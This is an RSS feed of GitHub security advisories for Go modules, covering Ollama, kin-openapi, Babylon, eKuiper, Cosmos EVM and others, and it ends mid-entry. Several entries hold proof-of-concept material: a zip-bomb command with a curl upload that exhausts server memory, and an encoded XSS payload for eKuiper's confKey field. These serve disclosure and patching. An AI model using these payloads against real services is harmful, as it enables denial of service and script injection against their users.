<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-05-16T07:01:35.525Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/ollama/ollama] Ollama Divide by Zero Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2xf2-gjm6-g2c6</id>
        <link href="https://github.com/advisories/GHSA-2xf2-gjm6-g2c6"/>
        <updated>2025-05-15T17:06:22.000Z</updated>
        <content type="html"><![CDATA[<p>A divide by zero vulnerability exists in ollama/ollama version v0.3.3. The vulnerability occurs when importing GGUF models with a crafted type for <code>block_count</code> in the Modelfile. This can lead to a denial of service (DoS) condition when the server processes the model, causing it to crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8063">https://nvd.nist.gov/vuln/detail/CVE-2024-8063</a></li>
<li><a href="https://huntr.com/bounties/fd8e1ed6-21d2-4c9e-8395-2098f11b7db9">https://huntr.com/bounties/fd8e1ed6-21d2-4c9e-8395-2098f11b7db9</a></li>
<li><a href="https://github.com/ollama/ollama/issues/8020">https://github.com/ollama/ollama/issues/8020</a></li>
<li><a href="https://github.com/advisories/GHSA-2xf2-gjm6-g2c6">https://github.com/advisories/GHSA-2xf2-gjm6-g2c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xf2-gjm6-g2c6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-20T12:32:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/linkerd/linkerd2] Linkerd resource exhaustion vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-42mr-jpwh-m9rv</id>
        <link href="https://github.com/advisories/GHSA-42mr-jpwh-m9rv"/>
        <updated>2025-05-15T16:57:28.000Z</updated>
        <content type="html"><![CDATA[<p>In Linkerd edge releases before edge-25.2.1, and Buoyant Enterprise for Linkerd releases 2.13.0–2.13.7, 2.14.0–2.14.10, 2.15.0–2.15.7, 2.16.0–2.16.4, and 2.17.0–2.17.1, resource exhaustion can occur for Linkerd proxy metrics.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-43915">https://nvd.nist.gov/vuln/detail/CVE-2025-43915</a></li>
<li><a href="https://docs.buoyant.io/security/advisories/2025-01">https://docs.buoyant.io/security/advisories/2025-01</a></li>
<li><a href="https://www.buoyant.io/resources">https://www.buoyant.io/resources</a></li>
<li><a href="https://github.com/advisories/GHSA-42mr-jpwh-m9rv">https://github.com/advisories/GHSA-42mr-jpwh-m9rv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-42mr-jpwh-m9rv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-05T18:32:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/getkin/kin-openapi] Improper Handling of Highly Compressed Data (Data Amplification) in github.com/getkin/kin-openapi/openapi3filter]]></title>
        <id>https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</id>
        <link href="https://github.com/advisories/GHSA-wq9g-9vfc-cfq9"/>
        <updated>2025-05-15T16:44:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When validating a request with a multipart/form-data schema, if the OpenAPI schema allows it, an attacker can upload a crafted ZIP file (e.g., a ZIP bomb), causing the server to consume all available system memory.</p>
<h3 id="details">Details</h3>
<p>The root cause comes from the <a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523">ZipFileBodyDecoder</a>, which is registered <a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275">automatically</a> by the module (contrary to what the <a href="https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse">documentation says</a>.</p>
<h3 id="poc">PoC</h3>
<p>To reproduce the vulnerability, you can use the following OpenAPI schema:</p>
<pre><code class="language-yaml">openapi: 3.0.0
info:
  title: 'Validator'
  version: 0.0.1
paths:
  /:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              required:
                - file
              properties:
                file:
                  type: string
                  format: binary
      responses:
        '200':
          description: Created
</code></pre>
<p>And this code to validate the request (nothing fancy, it basically only calls the <code>openapi3filter.ValidateRequest</code> function`):</p>
<pre><code class="language-go">package main

import (
    "fmt"
    "log"
    "net/http"

    "github.com/getkin/kin-openapi/openapi3filter"
    legacyrouter "github.com/getkin/kin-openapi/routers/legacy"

    "github.com/getkin/kin-openapi/openapi3"
)

func handler(w http.ResponseWriter, r *http.Request) {
    loader := openapi3.NewLoader()

    doc, err := loader.LoadFromFile("schema.yaml")
    if err != nil {
        http.Error(w, "Failed to load OpenAPI document", http.StatusInternalServerError)
        return
    }

    if err := doc.Validate(r.Context()); err != nil {
        http.Error(w, "Invalid OpenAPI document", http.StatusBadRequest)
        return
    }

    router, err := legacyrouter.NewRouter(doc)
    if err != nil {
        http.Error(w, "Failed to create router", http.StatusInternalServerError)
        return
    }

    route, pathParams, err := router.FindRoute(r)
    if err != nil {
        http.Error(w, "Failed to find route", http.StatusNotFound)
        return
    }

    input := &amp;openapi3filter.RequestValidationInput{
        Request:     r,
        QueryParams: r.URL.Query(),
        Route:       route,
        PathParams:  pathParams,
    }

    if err := openapi3filter.ValidateRequest(r.Context(), input); err != nil {
        http.Error(w, fmt.Sprintf("Request validation failed: %v", err), http.StatusBadRequest)
        return
    }

    w.Write([]byte("request ok !"))
}

func main() {
    http.HandleFunc("/", handler)
    log.Fatal(http.ListenAndServe(":8080", nil))

}
</code></pre>
<p>We also need to create a zip bomb. This command will create a 4.7GB file and compress it to to 4.7MB zip archive:</p>
<pre><code class="language-shell">perl -e 'print "0" x 5000000000' &gt; /tmp/bigfile.txt; zip -9 /tmp/bomb.zip /tmp/bigfile.txt
</code></pre>
<p>Run the PoC provided, and upload the zip bomb with <code>curl localhost:8080/  -F file="@/tmp/bomb.zip;type=application/zip" -v</code>.</p>
<p>Observe the memory consumption of the test server during and after the upload (it jumped to a bit over 22GB in my testing, with only a 4.7MB input file, you can reduce the size of the generated file to not kill your test machine when reproducing.) </p>
<h3 id="impact">Impact</h3>
<p>An attacker can trigger an out-of-memory (OOM) condition, leading to server crashes or degraded performance.
It seems to only be exploitable if the OpenAPI schema allows for multipart upload.</p>
<h3 id="remediation">Remediation</h3>
<p>I see at least 2 potential fixes/improvements:</p>
<ul>
<li>Do not register by default the zip file decoder (I honestly was a bit surprised to see it was enabled by default, it seems to be quite a niche use-case ?)</li>
<li>Update <code>ZipFileBodyDecoder</code> to enforce a maximum size of the decompressed archive and bailout as soon as it's reached (probably with a small default value and allow the users to configure it through the input options ?)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9">https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9</a></li>
<li><a href="https://github.com/getkin/kin-openapi/pull/1059">https://github.com/getkin/kin-openapi/pull/1059</a></li>
<li><a href="https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1">https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1</a></li>
<li><a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275</a></li>
<li><a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523</a></li>
<li><a href="https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse">https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30153">https://nvd.nist.gov/vuln/detail/CVE-2025-30153</a></li>
<li><a href="https://github.com/advisories/GHSA-wq9g-9vfc-cfq9">https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-19T18:12:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/redhatinsights/yggdrasil] Yggdrasil Vulnerable to Local Privilege Escalation]]></title>
        <id>https://github.com/advisories/GHSA-rpg2-jvhp-h354</id>
        <link href="https://github.com/advisories/GHSA-rpg2-jvhp-h354"/>
        <updated>2025-05-15T16:06:21.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Yggdrasil, which acts as a system broker, allowing the processes to communicate to other children's "worker" processes through the DBus component. Yggdrasil creates a DBus method to dispatch messages to workers. However, it misses authentication and authorization checks, allowing every system user to call it. One available Yggdrasil worker acts as a package manager with capabilities to create and enable new repositories and install or remove packages. </p>
<p>This flaw allows an attacker with access to the system to leverage the lack of authentication on the dispatch message to force the Yggdrasil worker to install arbitrary RPM packages. This issue results in local privilege escalation, enabling the attacker to access and modify sensitive system data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3931">https://nvd.nist.gov/vuln/detail/CVE-2025-3931</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:7592">https://access.redhat.com/errata/RHSA-2025:7592</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-3931">https://access.redhat.com/security/cve/CVE-2025-3931</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2362345">https://bugzilla.redhat.com/show_bug.cgi?id=2362345</a></li>
<li><a href="https://github.com/RedHatInsights/yggdrasil/commit/196d0cbea42f72e6dfecaa563681a99e9fdb4a38">https://github.com/RedHatInsights/yggdrasil/commit/196d0cbea42f72e6dfecaa563681a99e9fdb4a38</a></li>
<li><a href="https://github.com/advisories/GHSA-rpg2-jvhp-h354">https://github.com/advisories/GHSA-rpg2-jvhp-h354</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpg2-jvhp-h354</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-14T12:31:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/babylonlabs-io/babylon] Babylon Integer Overflow in Distribution Module CumulativeRewardRatio Calculation Leading to Chain Halt]]></title>
        <id>https://github.com/advisories/GHSA-869w-47c6-fq8q</id>
        <link href="https://github.com/advisories/GHSA-869w-47c6-fq8q"/>
        <updated>2025-05-15T14:05:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Minting large amount of tokens through ibc transfer and then depositing them in validator rewards pool (via <code>DepositValidatorRewardsPool</code> message) can lead to integer overflow panic when calculating <code>cumulative_reward_ratio</code> for the validator.</p>
<p>This calculation happens in <code>x/epoching</code> module <code>EndBlocker</code>, thus the panic will halt the chain.</p>
<h3 id="impact">Impact</h3>
<p>Denial of Service - Due to panic in the <code>EndBlocker</code> Babylon Genesis will halt</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-869w-47c6-fq8q">https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-869w-47c6-fq8q</a></li>
<li><a href="https://github.com/advisories/GHSA-869w-47c6-fq8q">https://github.com/advisories/GHSA-869w-47c6-fq8q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-869w-47c6-fq8q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-15T14:05:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/babylonlabs-io/babylon] Babylon Finality Provider `MsgCommitPubRandList` replay attack]]></title>
        <id>https://github.com/advisories/GHSA-7mm3-vfg8-7rg6</id>
        <link href="https://github.com/advisories/GHSA-7mm3-vfg8-7rg6"/>
        <updated>2025-05-15T14:05:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A high vulnerability exists in the Babylon protocol's x/finality module due to a lack of domain separation in signed messages, combined with insufficient validation in the MsgCommitPubRandList handler. Specifically, the handler does not enforce that the submitted Commitment field is 32 bytes long. This allows an attacker to replay a signature originally generated for a different message (e.g., a Proof-of-Possession in MsgCreateFinalityProvider) as a MsgCommitPubRandList. By crafting the message parameters, an attacker can use the typically 20-byte address bytes (from the PoP context) to form the StartHeight, NumPubRand, and a shorter-than-expected Commitment (e.g., 4 bytes). The replayed signature will pass verification for this crafted message, leading to the injection of an invalid PubRand commitment.</p>
<h3 id="impact">Impact</h3>
<p>Successful exploitation of this vulnerability, specifically via the PoP signature replay, allows an attacker to store an invalid PubRand commitment (with a non-standard length, e.g., 4 bytes) for a targeted Finality Provider (FP). Despite the commitment itself being malformed, it's the associated StartHeight and NumPubRand (derived from the replayed address bytes and typically very large) that cause severe consequences</p>
<h3 id="future-recommendations">Future recommendations</h3>
<p>To minimize future risk of such attacks, all finality providers should:</p>
<ol>
<li>Never re-use your finality provider EOTS across the networks (e.g., the testnet) or for any other purpose. </li>
<li>Never use EOTS keys to sign any other data than relevant to in-protocol messages. Ideally EOTS key should only be used to:<ul>
<li>Sign initial proof of possession message</li>
<li>Sign periodic randomness commits</li>
<li>Sign finality votes with every block</li>
</ul>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-7mm3-vfg8-7rg6">https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-7mm3-vfg8-7rg6</a></li>
<li><a href="https://github.com/advisories/GHSA-7mm3-vfg8-7rg6">https://github.com/advisories/GHSA-7mm3-vfg8-7rg6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mm3-vfg8-7rg6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-15T14:05:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper/v2] LF Edge eKuiper Vulnerable to Stored XSS in Configuration Key Functionality]]></title>
        <id>https://github.com/advisories/GHSA-9cwv-pxcr-hfjc</id>
        <link href="https://github.com/advisories/GHSA-9cwv-pxcr-hfjc"/>
        <updated>2025-05-14T21:41:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Stored Cross-Site Scripting (XSS) vulnerability allows attackers to inject malicious scripts into web applications, which can then be executed in the context of other users' browsers. This can lead to unauthorized access to sensitive information, session hijacking, and spreading of malware, impacting user data privacy and application integrity.</p>
<h3 id="details">Details</h3>
<p>A user with rights to modificate the service (e.g. kuiperUser role) can inject XSS Payload into Connection Configuration key <code>Name</code> (<code>confKey</code>) parameter. Then, after any user with access to this service (e.g. admin) will try to delete this key, a payload will act in victim's browser.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Authorize as a user with rights to modificate the service (e.g. kuiperUser role).</li>
<li>Create a service or go to the existing one and access the <em>Configuration &gt; Connection</em> page:</li>
</ol>
<p><img alt="*Configuration > Connection page" src="https://github.com/user-attachments/assets/d29cbc23-04a4-4a49-bbd9-b26f74282c5c"></p>
<ol start="3">
<li>Open any existing Connection and press on <code>Add configuration key</code>:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/623dc76a-076c-41be-98d7-8fd42ed4e8fd"></p>
<ol start="4">
<li>Set any name and Address, then intercept the request and add the following payload to the <code>confKey</code> parameter: <code>123%3Cimg%20src=1%20onerror%3dalert%281%29%3E</code>:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/405000db-ace9-4bca-ac52-7dc44c54a0ae"></p>
<ol start="5">
<li>A new configuration key then will be set:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/43b75f1e-81ac-4815-9250-c1a0707827d3"></p>
<ol start="6">
<li><em>(Optional)</em> You can authorize another user with access to this service. For nexe steps I will use admin user</li>
<li>After we push on delete button (trash icon) opposite the created connection, the payload will work:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/05a38899-343b-4f76-b6c7-8e27587e3cdf"></p>
<h3 id="impact">Impact</h3>
<p>Stored Cross-site Scripting (XSS) vulnerability</p>
<p>Reported by Alexey Kosmachev, Lead Pentester from Bi.Zone</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-9cwv-pxcr-hfjc">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-9cwv-pxcr-hfjc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52290">https://nvd.nist.gov/vuln/detail/CVE-2024-52290</a></li>
<li><a href="https://github.com/lf-edge/ekuiper/commit/943c02e10f0f8349e609474810eab5fa460d1a51">https://github.com/lf-edge/ekuiper/commit/943c02e10f0f8349e609474810eab5fa460d1a51</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwv-pxcr-hfjc">https://github.com/advisories/GHSA-9cwv-pxcr-hfjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwv-pxcr-hfjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-14T21:41:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper] LF Edge eKuiper Vulnerable to Stored XSS in Configuration Key Functionality]]></title>
        <id>https://github.com/advisories/GHSA-9cwv-pxcr-hfjc</id>
        <link href="https://github.com/advisories/GHSA-9cwv-pxcr-hfjc"/>
        <updated>2025-05-14T21:41:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Stored Cross-Site Scripting (XSS) vulnerability allows attackers to inject malicious scripts into web applications, which can then be executed in the context of other users' browsers. This can lead to unauthorized access to sensitive information, session hijacking, and spreading of malware, impacting user data privacy and application integrity.</p>
<h3 id="details">Details</h3>
<p>A user with rights to modificate the service (e.g. kuiperUser role) can inject XSS Payload into Connection Configuration key <code>Name</code> (<code>confKey</code>) parameter. Then, after any user with access to this service (e.g. admin) will try to delete this key, a payload will act in victim's browser.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Authorize as a user with rights to modificate the service (e.g. kuiperUser role).</li>
<li>Create a service or go to the existing one and access the <em>Configuration &gt; Connection</em> page:</li>
</ol>
<p><img alt="*Configuration > Connection page" src="https://github.com/user-attachments/assets/d29cbc23-04a4-4a49-bbd9-b26f74282c5c"></p>
<ol start="3">
<li>Open any existing Connection and press on <code>Add configuration key</code>:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/623dc76a-076c-41be-98d7-8fd42ed4e8fd"></p>
<ol start="4">
<li>Set any name and Address, then intercept the request and add the following payload to the <code>confKey</code> parameter: <code>123%3Cimg%20src=1%20onerror%3dalert%281%29%3E</code>:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/405000db-ace9-4bca-ac52-7dc44c54a0ae"></p>
<ol start="5">
<li>A new configuration key then will be set:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/43b75f1e-81ac-4815-9250-c1a0707827d3"></p>
<ol start="6">
<li><em>(Optional)</em> You can authorize another user with access to this service. For nexe steps I will use admin user</li>
<li>After we push on delete button (trash icon) opposite the created connection, the payload will work:</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/05a38899-343b-4f76-b6c7-8e27587e3cdf"></p>
<h3 id="impact">Impact</h3>
<p>Stored Cross-site Scripting (XSS) vulnerability</p>
<p>Reported by Alexey Kosmachev, Lead Pentester from Bi.Zone</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-9cwv-pxcr-hfjc">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-9cwv-pxcr-hfjc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52290">https://nvd.nist.gov/vuln/detail/CVE-2024-52290</a></li>
<li><a href="https://github.com/lf-edge/ekuiper/commit/943c02e10f0f8349e609474810eab5fa460d1a51">https://github.com/lf-edge/ekuiper/commit/943c02e10f0f8349e609474810eab5fa460d1a51</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwv-pxcr-hfjc">https://github.com/advisories/GHSA-9cwv-pxcr-hfjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwv-pxcr-hfjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-14T21:41:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/kubernetes-csi/csi-proxy/v2] Kubernetes csi-proxy vulnerable to privilege escalation due to improper input validation]]></title>
        <id>https://github.com/advisories/GHSA-r6cc-7wj7-gfx2</id>
        <link href="https://github.com/advisories/GHSA-r6cc-7wj7-gfx2"/>
        <updated>2025-05-14T19:19:17.000Z</updated>
        <content type="html"><![CDATA[<p>Kubernetes is vulnerable to privilege escalation when a user that can create pods on Windows nodes running kubernetes-csi-proxy may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they include Windows nodes running kubernetes-csi-proxy.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3893">https://nvd.nist.gov/vuln/detail/CVE-2023-3893</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/119594">https://github.com/kubernetes/kubernetes/issues/119594</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/lWksE2BoCyQ">https://groups.google.com/g/kubernetes-security-announce/c/lWksE2BoCyQ</a></li>
<li><a href="https://github.com/kubernetes-csi/csi-proxy/commit/0e83a68159111e4ee510f5aa56d47ba97bda60c7">https://github.com/kubernetes-csi/csi-proxy/commit/0e83a68159111e4ee510f5aa56d47ba97bda60c7</a></li>
<li><a href="https://github.com/kubernetes-csi/csi-proxy/commit/2523e6674dedf3de27f84235efec28555da24664">https://github.com/kubernetes-csi/csi-proxy/commit/2523e6674dedf3de27f84235efec28555da24664</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20231221-0004">https://security.netapp.com/advisory/ntap-20231221-0004</a></li>
<li><a href="https://github.com/advisories/GHSA-r6cc-7wj7-gfx2">https://github.com/advisories/GHSA-r6cc-7wj7-gfx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6cc-7wj7-gfx2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-03T18:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/evm] Cosmos EVM Allows Partial Precompile State Writes]]></title>
        <id>https://github.com/advisories/GHSA-mjfq-3qr2-6g84</id>
        <link href="https://github.com/advisories/GHSA-mjfq-3qr2-6g84"/>
        <updated>2025-05-14T17:35:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Setting lower EVM call gas allows users to partially execute precompiles and error at specific points in the precompile code without reverting the partially written state. </p>
<p>If executed on the distribution precompile when claiming funds, it could cause funds to be transferred to a user without resetting the claimable rewards to 0. The vulnerability could also be used to cause indeterministic execution by failing at other points in the code, halting validators.</p>
<p>Any evmOS or Cosmos EVM chain using precompiles is affected.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability was patched by wrapping each precompile execution into an atomic function that reverts any partially committed state on error.</p>
<ul>
<li><a href="https://github.com/evmos/os">evmos/os</a> patch file: <a href="https://drive.google.com/file/d/1LfC0WSrQOqwTOW3qfaE6t8Jqf1PLVtS_/">https://drive.google.com/file/d/1LfC0WSrQOqwTOW3qfaE6t8Jqf1PLVtS_/</a></li>
</ul>
<p>For chains using a different file structure, you must manually apply the diff:</p>
<h3 id="in-xevmstatedbgo"><strong>In <code>x/evm/statedb.go</code>:</strong></h3>
<p>Add the following function:</p>
<pre><code class="language-go">func (s *StateDB) RevertMultiStore(cms storetypes.CacheMultiStore, events sdk.Events) {
    s.cacheCtx = s.cacheCtx.WithMultiStore(cms)
    s.writeCache = func() {
        // rollback the events to the ones
        // on the snapshot
        s.ctx.EventManager().EmitEvents(events)
        cms.Write()
    }
}
</code></pre>
<h3 id="in-xevmstatedbjournalgo"><strong>In <code>x/evm/statedb/journal.go</code>:</strong></h3>
<p>Replace the <code>Revert</code> function with the following:</p>
<pre><code class="language-go">func (pc precompileCallChange) Revert(s *StateDB) {
    // rollback multi store from cache ctx to the previous
    // state stored in the snapshot
    s.RevertMultiStore(pc.multiStore, pc.events)
}
</code></pre>
<h3 id="in-precompilescommonprecompilego"><strong>In <code>precompiles/common/precompile.go</code>:</strong></h3>
<p>Change the function signature in <code>HandleGasError</code> to:</p>
<pre><code class="language-go">func HandleGasError(ctx sdk.Context, contract *vm.Contract, initialGas storetypes.Gas, err *error, stateDB *statedb.StateDB, snapshot snapshot) func() {
...
}
</code></pre>
<p>In the <code>HandleGasError</code> function, add the following line in the switch statement in the <code>case storetypes.ErrorOutOfGas:</code> case:</p>
<pre><code class="language-go">stateDB.RevertMultiStore(snapshot.MultiStore, snapshot.Events)
</code></pre>
<p>Add the following function:</p>
<pre><code class="language-go">// RunAtomic is used within the Run function of each Precompile implementation.
// It handles rolling back to the provided snapshot if an error is returned from the core precompile logic.
// Note: This is only required for stateful precompiles.
func (p Precompile) RunAtomic(s snapshot, stateDB *statedb.StateDB, fn func() ([]byte, error)) ([]byte, error) {
    bz, err := fn()
    if err != nil {
        // revert to snapshot on error
        stateDB.RevertMultiStore(s.MultiStore, s.Events)
    }
    return bz, err
}
</code></pre>
<h3 id="all-precompiles"><strong>All Precompiles:</strong></h3>
<p>Finally, in each precompile, locate the <code>Run</code> function, and wrap each switch statement and return values into <code>p.RunAtomic</code>. For example:</p>
<pre><code class="language-go">// Run executes the precompiled contract IBC transfer methods defined in the ABI.
func (p Precompile) Run(evm *vm.EVM, contract *vm.Contract, readOnly bool) (bz []byte, err error) {
    ctx, stateDB, snapshot, method, initialGas, args, err := p.RunSetup(evm, contract, readOnly, p.IsTransaction)
    if err != nil {
        return nil, err
    }

    // This handles any out of gas errors that may occur during the execution of a precompile tx or query.
    // It avoids panics and returns the out of gas error so the EVM can continue gracefully.
    defer cmn.HandleGasError(ctx, contract, initialGas, &amp;err, stateDB, snapshot)()

        // === WRAP HERE ===
    return p.RunAtomic(snapshot, stateDB, func() ([]byte, error) {
        switch method.Name {
        // TODO Approval transactions =&gt; need cosmos-sdk v0.46 &amp; ibc-go v6.2.0
        // Authorization Methods:
        case exampleCase:
            bz, err = p.example(ctx, evm.Origin, stateDB, method, args)
        default:
            return nil, fmt.Errorf(cmn.ErrUnknownMethod, method.Name)
        }

        if err != nil {
            return nil, err
        }

        cost := ctx.GasMeter().GasConsumed() - initialGas

        if !contract.UseGas(cost) {
            return nil, vm.ErrOutOfGas
        }

        if err := p.AddJournalEntries(stateDB, snapshot); err != nil {
            return nil, err
        }

        return bz, nil
    })
}
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds for chains that make use of precompiles. A coordinated upgrade is necessary to patch the issue.</p>
<h3 id="testing">Testing</h3>
<p>A test was introduced in the distribution precompile to ensure that partial state writes no longer occur when a lower gas amount is set.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/evm/security/advisories/GHSA-mjfq-3qr2-6g84">https://github.com/cosmos/evm/security/advisories/GHSA-mjfq-3qr2-6g84</a></li>
<li><a href="https://github.com/cosmos/evm/commit/0fff8c144b24effbcb3addd666150ba5989d631c">https://github.com/cosmos/evm/commit/0fff8c144b24effbcb3addd666150ba5989d631c</a></li>
<li><a href="https://drive.google.com/file/d/1LfC0WSrQOqwTOW3qfaE6t8Jqf1PLVtS_">https://drive.google.com/file/d/1LfC0WSrQOqwTOW3qfaE6t8Jqf1PLVtS_</a></li>
<li><a href="https://github.com/advisories/GHSA-mjfq-3qr2-6g84">https://github.com/advisories/GHSA-mjfq-3qr2-6g84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mjfq-3qr2-6g84</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-14T17:35:54.000Z</published>
    </entry>
    <entry>
